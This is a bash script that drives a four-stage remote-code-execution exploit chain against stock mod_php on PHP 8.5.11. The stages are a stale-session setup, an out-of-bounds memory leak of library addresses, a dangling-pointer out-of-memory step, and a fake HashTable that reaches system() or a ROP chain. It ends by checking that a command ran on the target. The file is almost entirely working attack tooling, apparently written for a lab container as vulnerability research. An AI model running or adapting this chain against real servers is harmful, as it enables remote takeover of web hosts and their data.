#!/usr/bin/env bash
# php2shell display_errors=Off full chain (stock PHP 8.5.11, 128M).
#
# usage: ./run_off_chain.sh [port] [proof-path]
#   port        target port (default 8091)
#   proof-path  file written by `id>` inside the target; must be writable by
#               the web user (default /tmp/off_proof). Set CONTAINER=<name> to
#               read it through docker exec (lab: CONTAINER=p2s-8511-off).
#               The target-side file is removed before B2, so a stale proof
#               cannot mask a failed run.
#
# Target: stock mod_php with php.ini-production and one persistent worker
# (lab: apache2 -X; stock prefork: pin a child). B2 kills the worker after
# system(), so start a fresh one before each run. The image stock Apache on
# port 80 is not the target; the lab config listens on 8091.
# The exploit is pure HTTP; gdb is not required.
set -euo pipefail

PORT=${1:-8091}
PROOF=${2:-/tmp/off_proof}
CONTAINER=${CONTAINER:-}
DIR=$(cd "$(dirname "$0")" && pwd)
TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT

echo "[1/4] A1: send_cookie=1 + stale PS(id) at page 0x137"
python3 "$DIR/mk_a1_off.py" --out "$TMP/a1.bin" \
    --progress-early --progress-len=4044 --post40=1 --big=78 --burners=19 \
    --cttail=4000 --sid-late >/dev/null
V=$(printf 'v%.0s' $(seq 1 15))
Q="q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
for i in $(seq 0 7); do Q="$Q&g$i=$V"; done
A1_OUT=$(python3 "$DIR/chunked_send.py" --port "$PORT" --body-file "$TMP/a1.bin" \
    --path "/index.php?$Q" 2>&1) || true
case "$A1_OUT" in
  *500*) printf '      %s\n' "$A1_OUT" ;;
  *)
    printf '%s\n' "$A1_OUT" >&2
    echo "A1 did not return 500. The 8091 single worker is dead or stopped." >&2
    echo "Restart it (and kill any gdb probe): docker exec -d <container> apache2 -f /tmp/httpd.conf -X" >&2
    exit 1
    ;;
esac
sleep 0.15

echo "[2/4] B1: forged-zend_string OOB read (main + libphp)"
rm -f /tmp/off_leak.resp
if ! php "$DIR/off_b1b.php" "$PORT" 14 0x137 0xC8000 0x1018 300 0 400 0 >/dev/null 2>&1; then
    echo "B1 request failed (no response). Restart the 8091 worker." >&2
    exit 1
fi
sleep 0.15
if ! read -r MAIN LIB < <(php "$DIR/parse_leak.php" /tmp/off_leak.resp); then
    echo "leak parse failed" >&2
    exit 1
fi
echo "      main=0x$MAIN libphp=0x$LIB"

echo "[3/4] A2: cheap OOM, dangling PS(http_session_vars)"
python3 "$DIR/cheap_oom_a.py" --port "$PORT" --parts 880 --depth 64 --fillers 115 >/dev/null 2>&1 || true
sleep 0.2

case "${STAGE3:-stage3_off.php}" in
  stage3_rop.php) B2_DESC="pivot + popen ROP" ;;
  *) B2_DESC="zif_system" ;;
esac
echo "[4/4] B2: fake reference + fake HashTable -> $B2_DESC"
if [ -n "$CONTAINER" ]; then
    docker exec "$CONTAINER" rm -f "$PROOF" 2>/dev/null || true
else
    rm -f "$PROOF"
fi
php "$DIR/${STAGE3:-stage3_off.php}" "$PORT" "$MAIN" "$LIB" "{ id; date; }>$PROOF" 2>&1 || true
sleep 0.5

if [ -n "$CONTAINER" ]; then
    if docker exec "$CONTAINER" test -s "$PROOF" 2>/dev/null; then
        echo "RCE OK"
        docker exec "$CONTAINER" cat "$PROOF"
        exit 0
    fi
elif [ -s "$PROOF" ]; then
    echo "RCE OK"
    cat "$PROOF"
    exit 0
fi
echo "RCE failed: no proof at $PROOF" >&2
exit 1
